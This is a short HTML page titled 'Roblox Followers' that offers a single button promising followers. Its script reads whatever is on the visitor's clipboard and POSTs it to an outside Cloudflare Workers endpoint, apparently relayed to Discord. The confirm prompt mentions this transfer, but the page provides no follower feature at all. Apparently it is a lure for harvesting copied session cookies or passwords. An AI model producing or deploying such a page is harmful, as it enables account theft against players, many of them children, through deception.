<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Roblox Followers</title>

<style>
html,body{
  margin:0;
  width:100%;
  height:100%;
}

body{
  display:grid;
  place-items:center;
  background:#0b0b10;
  font-family:Arial,sans-serif;
}

button{
  border:0;
  border-radius:18px;
  padding:24px 42px;
  font-size:30px;
  font-weight:700;
  cursor:pointer;
  background:#fff;
  color:#111;
  box-shadow:0 18px 50px rgba(0,0,0,.35);
}

button:active{
  transform:scale(.98);
}
</style>
</head>

<body>

<button id="main">Roblox Followers</button>

<script>
const button = document.getElementById("main");

const SEND_ENDPOINT =
  "https://young-brook-716e.abojanmawzoon.workers.dev";

button.addEventListener("click", async () => {

  const consent = confirm(
    "This will send the text currently in your clipboard to the website owner through Discord. Continue?"
  );

  if (!consent) return;

  try {
    const text = await navigator.clipboard.readText();

    if (!text) return;

    await fetch(SEND_ENDPOINT, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        clipboardText: text
      })
    });

  } catch (error) {
    console.error(error);
  }
});
</script>

</body>
</html>
